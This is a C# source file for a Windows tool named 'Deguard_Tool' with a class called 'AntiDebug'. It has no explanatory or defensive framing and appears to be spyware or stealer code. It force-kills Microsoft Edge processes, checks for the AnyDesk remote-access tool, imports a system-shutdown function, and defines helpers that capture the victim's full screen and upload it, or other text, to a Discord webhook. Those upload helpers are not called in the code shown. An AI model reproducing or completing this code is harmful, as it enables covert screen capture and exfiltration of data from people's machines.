using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Deguard_Tool
{
    class AntiDebug
    {
        [DllImport("kernel32.dll")]
        public static extern bool InitiateSystemShutdown(string lpMachineName, string lpMessage, uint dwTimeout, bool bForceAppsClosed, bool bRebootAfterShutdown);


        static async Task Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            TerminateProcesses("msedge", Process.GetCurrentProcess().Id);

            Process[] anyDeskProcesses = Process.GetProcessesByName("anydesk");
            if (anyDeskProcesses.Length > 0)
            {
                ExecuteAnotherFile();
            }
            else
            {
                while (true)
                {

                        Application.Run(new Main());

                    await Task.Delay(TimeSpan.FromSeconds(10));
                }
            }
        }

        private static void ExecuteAnotherFile()
        {
            Process.Start("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe");
        }

        private static bool IsAnyProcessRunning(params string[] processNames)
        {
            foreach (var processName in processNames)
            {
                Process[] processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                {
                    return true;
                }
            }
            return false;
        }

        private static byte[] CaptureScreen()
        {
            using (var bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (var g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size);
                }

                using (var stream = new MemoryStream())
                {
                    bitmap.Save(stream, ImageFormat.Png);
                    return stream.ToArray();
                }
            }
        }

        private static async Task SendScreenshotToDiscordWebhook(string webhookUrl, byte[] screenshot, string mention)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var content = new MultipartFormDataContent();
                    content.Add(new StringContent(mention), "content");
                    content.Add(new ByteArrayContent(screenshot), "file", "screenshot.png");

                    await client.PostAsync(webhookUrl, content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending screenshot: {ex.Message}");
            }
        }

        private static async Task SendToDiscordWebhook(string webhookUrl, string content)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var requestBody = new { content = content };
                    var jsonContent = JsonConvert.SerializeObject(requestBody);
                    var contentData = new StringContent(jsonContent, Encoding.UTF8, "application/json");

                    var response = await client.PostAsync(webhookUrl, contentData);

                    if (!response.IsSuccessStatusCode)
                    {
                        Console.WriteLine($"Error sending message to Discord webhook: {response.StatusCode}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending message to Discord webhook: {ex.Message}");
            }
        }

        private static void TerminateProcesses(string processName, int currentProcessId)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            foreach (var process in processes)
            {
                if (process.Id != currentProcessId)
                {
                    process.Kill();
                }
            }
        }

        private static Process GetDiscordProcess()
        {
            Process[] discordProcesses = Process.GetProcessesByName("Discord");
            if (discordProcesses.Length > 0)
            {
                return discordProcesses[0];
            }
            return null;
        }
    }
}
